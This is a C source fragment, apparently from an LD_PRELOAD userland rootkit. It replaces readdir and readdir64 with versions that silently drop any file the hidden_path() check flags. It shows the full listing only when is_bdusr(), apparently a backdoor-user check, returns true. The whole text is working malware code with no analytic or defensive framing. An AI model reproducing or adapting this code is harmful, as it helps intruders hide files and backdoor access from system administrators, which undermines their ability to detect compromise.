struct dirent *readdir(DIR *dirp){
    char path[4097], *filename;
    struct dirent *dir;

    hook(CREADDIR);

    do{
        dir = call(CREADDIR, dirp);
        if(is_bdusr()) return dir;
        if(dir == NULL) continue;
        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0")) continue;

        filename = gdirname(dirp);
        snprintf(path, sizeof(path)-1, "%s/%s", filename, dir->d_name);
        free(filename);
    } while(dir && hidden_path(path));

    return dir;
}

struct dirent64 *readdir64(DIR *dirp){
    char path[4097], *filename;
    struct dirent64 *dir;

    hook(CREADDIR64);

    do{
        dir = call(CREADDIR64, dirp);
        if(is_bdusr()) return dir;
        if(dir == NULL) continue;
        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0")) continue;

        filename = gdirname(dirp);
        snprintf(path, sizeof(path)-1, "%s/%s", filename, dir->d_name);
        free(filename);
    }while(dir && hidden_path(path));

    return dir;
}